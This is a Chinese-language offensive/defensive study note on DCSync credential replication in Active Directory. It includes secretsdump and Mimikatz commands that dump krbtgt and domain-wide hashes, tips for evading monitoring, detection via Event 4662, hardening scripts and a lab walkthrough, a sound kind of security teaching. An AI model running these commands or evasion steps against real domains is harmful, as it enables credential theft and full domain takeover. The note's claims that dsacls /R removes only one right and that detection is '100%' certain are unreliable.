# R16.1 目錄服務憑證同步複製機制分析 (Directory Credential Replication / DCSync)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**目錄服務憑證同步複製 (DCSync)** 是針對 Windows Active Directory (AD) 網域最具毀滅性的橫向/特權榨取技術。其本質為：**「攻擊者利用 Windows 目錄複製服務遠端協定 (MS-DRSR)，假冒成一部合法的網域控制站 (Domain Controller, DC)；當攻擊帳號具備特定目錄複製延伸權限時，可直接向目標 DC 發送 `DsGetNCChanges` RPC 請求，要求 DC 主動將包括 `krbtgt`、Domain Admin 等全域帳號的 NTLM 雜湊值與 Kerberos AES 金鑰打包同步回傳，整個過程無須登入 DC 本機，亦無須在 DC 上觸發 LSASS 記憶體讀取」**。

```
[攻擊者終端] ── 1. 發送 RPC 綁定請求 (DRSUAPI: DsBind) ──► [目標網域控制站 (DC)]
      │                                                        │
      │ ◄── 2. 回傳 RPC Handle (驗證連線憑證合法) ────────────┘
      │
      ├── 3. 發送 DsGetNCChanges (請求提取帳號 Administrator / krbtgt 之憑證屬性)
      ▼
[目標 DC 驗證權限]
      │
      ├── 4. 檢查調用者具備 Replicating Directory Changes All 延伸權限
      ▼ 5. 打包 NTLM Hash / Kerberos 金鑰，序列化後透過 RPC 串流回傳
[攻擊者控制台] ◄── 6. 截獲全域金鑰 ➔ 產製黃金票據 (Golden Ticket) 接管全網！
```

### 核心作戰決策與邊界
- **必要權限條件**：調用帳號必須在網域根物件上擁有以下兩項延伸權限（預設僅有 Domain Controllers、Enterprise Domain Controllers、Domain Admins 擁有；但錯誤委派常賦予一般服務帳號）：
  - `DS-Replication-Get-Changes` (GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
  - `DS-Replication-Get-Changes-All` (GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)
- **技術邊界**：
  - **與 NTDS.dit 提取差異**：DCSync 是純網路層 RPC 呼叫，不需取得 DC 本機管理員權限，不需觸發 VSS 磁碟陰影複製，也不會在 DC 磁碟落地任何檔案。

## 🔬 第一動：MS-DRSR 協定與複寫權限全景解剖 (Mechanics & Replication Protocol)

### 1. MS-DRSR 核心 RPC 呼叫流程

```
[客戶端] ────(RPC Port 135 ➔ 動態 RPC 埠)────► [網域控制站 (DC)]
   1. DRSBind()              ➔ 建立 DRSUAPI 會話並協商支援的延伸功能
   2. DRSCrackNames()        ➔ 將帳號名稱 (如 krbtgt) 轉換為目錄物件的 GUID
   3. DRSGetNCChanges()      ➔ 指定物件 GUID 與屬性集，拉取加密的憑證屬性 (unicodePwd)
```

### 2. DCSync 關鍵延伸權限 GUID 速查表

| 權限名稱 (Active Directory Extended Right) | Rights-GUID | 作用與最低要求 |
| :--- | :--- | :--- |
| **`DS-Replication-Get-Changes`** | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | 允許複寫常規目錄變更（基本目錄屬性） |
| **`DS-Replication-Get-Changes-All`** | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | **致命關鍵**：允許複寫包含機密密碼雜湊在內的所有機密屬性 |
| **`DS-Replication-Get-Changes-In-Filtered-Set`** | `89e95b76-444d-4c62-991a-0facbeda5f13` | 允許唯讀網域控制站 (RODC) 複寫過濾屬性集 |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心利用指令速查表

#### 1. Impacket secretsdump.py 遠端 DCSync
```bash
# 針對指定帳號提取 NTLM Hash 與 Kerberos Keys
python3 secretsdump.py -just-dc-user "krbtgt" "corp.internal/operator:P@ssword123@10.0.0.1"

# 導出整個網域所有帳號憑證庫 (全域脫褲)
python3 secretsdump.py -just-dc "corp.internal/operator:P@ssword123@10.0.0.1"
```

#### 2. Mimikatz 本地與遠端 DCSync
```cmd
privilege::debug
# 提取指定使用者憑證
lsadump::dcsync /domain:corp.internal /user:Administrator

# 提取 krbtgt 帳號憑證（用於偽造黃金票據）
lsadump::dcsync /domain:corp.internal /user:krbtgt
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **鎖定特定次要 DC 規避核心監控**：
  - 大型企業通常在主機房部署嚴格監控；攻擊者可將 DCSync 流量導向分公司或邊緣站點的次要 DC，藉由次要 DC 較寬鬆的告警規則完成金鑰提取。
- **鑑識與遙測特徵 (Windows Event ID 4662)**：
  - **核心告警事件**：Security Log 中記錄 **Event ID 4662**（對物件執行操作）。
  - **關鍵過濾欄位**：
    - `ObjectType`: `19195a5b-6da0-11d0-afd3-00c04fd930c9` (Domain-DNS 物件)
    - `AccessMask`: `0x100` (Control Access)
    - `Properties`: 包含 `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (`Replicating Directory Changes All`)
  - **致命異常判準**：發起上述 RPC 請求的**客戶端 IP 或電腦名稱不屬於任何已註冊的合法 DC**！

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **DRSGetNCChanges 調用** | Event 4662 出現複寫 GUID；來源非 DC IP | 稽核網域根物件 ACL，撤除非必要帳號複寫特權 | 劫持已具備特權的現有備份服務帳號 |
| **全域憑證導出** | 瞬時產生數千次 4662 讀取事件 | 部署 Microsoft Defender for Identity (MDI) 警報 | 限制單日只提取 1 個帳號，極度緩慢發送探針 |
| **RPC 協定隱匿** | 捕獲 DRSUAPI RPC 介面呼叫流量 | 內部防火牆限制 DC 間 RPC (135/動態) 僅限 DC 群 | 透過同一網段內其他已失陷主機充當代理中繼 |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. PowerShell 稽核網域根物件具備 DCSync 權限的異常帳號
```powershell
# 檢測非 DC 帳號卻擁有複寫特權的危險委派 (BloodHound 原理)
Import-Module ActiveDirectory
$RootDSE = Get-ADRootDSE
$Domain = Get-ADDomain

Get-Acl "AD:\$($Domain.DistinguishedName)" | Select-Object -ExpandProperty Access | 
    Where-Object { 
        $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or 
        $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" 
    } | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType
```

### 2. 撤銷非必要複寫特權 (加固命令)
```powershell
# 自特定服務帳號上移除 Replicating Directory Changes All 延伸權限
dsacls "$($Domain.DistinguishedName)" /R "CORP\svc-backup"
```

### 3. 開啟 Event ID 4662 高級稽核原則
在群組原則 (GPO) 中啟用：
- `Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Advanced Audit Policy Configuration -> DS Access -> Audit Directory Service Access` 設為 **Success**。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心環境模擬
- **網域環境**：`corp.internal`
- **攻擊帳號**：`operator` (一般網域使用者，但遭人為錯誤配置了 DCSync 延伸權限)
- **目標 DC**：`10.0.0.1 (DC01.corp.internal)`

### 2. 三步驗證流程

1. **驗證帳號是否具備複寫權限 (PowerView 探測)**：
   ```powershell
   Get-DomainObjectAcl -SearchBase "DC=corp,DC=internal" | ? {$_.SecurityIdentifier -match "S-1-5-21-.*-1105"}
   # 檢查 ObjectAceType 是否包含 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
   ```
2. **發動 DCSync 提取 krbtgt 雜湊值**：
   ```bash
   python3 secretsdump.py -just-dc-user "krbtgt" "corp.internal/operator:P@ssword123@10.0.0.1"
   ```
   **預期回顯**：
   ```text
   [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
   krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b3a28c46599e034293f01c876251b5c2:::
   [*] Cleaning up...
   ```
3. **安全加固驗證**：
   - 撤銷 `operator` 帳號的複寫權限後重新執行上述指令，回顯：  
     `[-] Access denied (0x5 / STATUS_ACCESS_DENIED)`，加固生效！

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. DCSync 與傳統在 DC 上抓取 NTDS.dit 相比，最大的戰術優勢是什麼？**  
  *分析思路*：DCSync 是純網路層 RPC 呼叫；不需要 RDP 或 WinRM 登入 DC，不需要 DC 本機管理員權限，不觸發 VSS 磁碟複製，不向磁碟寫入任何檔案，亦不讀取 DC 上的 LSASS 記憶體，隱蔽性極高。

- [ ] **Q2. DCSync 成立的兩個最核心 Active Directory 延伸權限 GUID 為何？**  
  *分析思路*：`DS-Replication-Get-Changes` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) 與 `DS-Replication-Get-Changes-All` (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)。

- [ ] **Q3. 獲取 `krbtgt` 帳號的 NTLM Hash 後，紅隊下一步能發動什麼不可逆的頂級攻擊？**  
  *分析思路*：可利用 `krbtgt` 金鑰鍛造 Kerberos 黃金票據 (Golden Ticket)；以該票據偽造任意權限（如 Enterprise Admins）訪問全域所有資源，且改密碼無法立即失效。

- [ ] **Q4. 藍隊在 SIEM 關聯規則中，偵測 DCSync 攻擊最有效的特徵指標是什麼？**  
  *分析思路*：監控 Windows Event ID 4662；若對象為 Domain-DNS 物件且帶有 `Replicating Directory Changes All` GUID，但請求來源 IP 不是任何合法的網域控制站 IP，即可 100% 判定為 DCSync 攻擊。

- [ ] **Q5. 徹底防範 DCSync 憑證洩漏的加固基線為何？**  
  *分析思路*：定期使用腳本或 BloodHound 審計網域根物件 ACL，將所有非 DC 的使用者或服務帳號徹底從複寫權限清單中剔除；啟用目錄服務高級存取稽核。
